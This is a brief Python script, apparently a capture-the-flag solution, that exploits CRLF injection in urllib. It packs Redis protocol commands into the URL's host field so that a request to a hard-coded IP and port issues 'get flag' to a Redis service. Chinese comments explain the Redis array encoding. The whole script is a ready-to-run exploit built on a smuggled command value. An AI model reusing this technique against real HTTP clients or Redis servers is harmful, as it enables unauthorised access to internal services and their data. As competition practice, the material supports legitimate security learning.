import urllib.request

host = '114.55.65.251:46379?\r\n*2\r\n$3\r\nget\r\n$4\r\nflag\r\n'
# \
       # '?*2\r\n$3\r\nget\r\n$4\r\nflag\r\n'
#  \r\n:CRLF *3 Redis 传数组的元素个数 $3表示元素共3个char（字符
url = f'http://{host}/'
print(url)

res = urllib.request.urlopen(url)
print(res.read())